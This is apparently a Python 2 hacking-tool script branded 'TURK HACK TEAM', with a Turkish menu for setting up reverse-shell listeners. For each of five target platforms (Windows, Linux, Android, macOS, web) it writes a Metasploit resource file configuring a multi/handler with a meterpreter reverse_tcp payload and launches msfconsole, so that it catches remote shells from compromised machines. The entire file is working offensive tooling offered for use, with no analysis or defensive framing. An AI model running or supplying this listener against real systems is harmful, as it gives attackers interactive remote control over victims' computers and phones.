import os 
def listener():
	print("""

_______________          |*\_/*|________ 
|  ___________  |        ||_/-\_|______  | 
| |           | |        | |           | | 
| |   0   0   | |        | |   0   0   | | 
| |     -     | |-> -> ->| |     -     | | 
| |   \___/   | |        | |   \___/   | | 
| |___     ___| |        | |___________| | 
|_____|\_/|_____|        |_______________| 
 _|__|/ \|_|_.............._|________|_
/ ********** \            / ********** \ 
 ************ \          / ************ \ 	    

	1. Windows Dinleyici
	2. Linux Dinleyici
	3. Android Dinleyici
	4. MacOS Dinleyici
	5. Web Dinlieyici

	""")
	ch = raw_input("Hangi sistemi dinlemek istersiniz? #~: ")
	if(ch=="1"):
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Secmis oldugunuz port: ")
		os.system("figlet TURK HACK TEAM")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload windows/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener.rc')
	if(ch=="2"):
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Secmis oldugunuz port: ")
		os.system("figlet TURK HACK TEAM")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener2.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload python/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener2.rc') 
	if(ch=="3"):
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Secmis oldugunuz port: ")
		os.system("figlet TURK HACK TEAM")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener3.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload android/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener3.rc') 
	if(ch=="4"):
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Secmis oldugunuz port: ")
		os.system("figlet TURK HACK TEAM")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener4.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload java/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener4.rc') 
	if(ch=="5"):
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Secmis oldugunuz port: ")
		os.system("figlet TURK HACK TEAM")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener5.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload php/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener5.rc')  
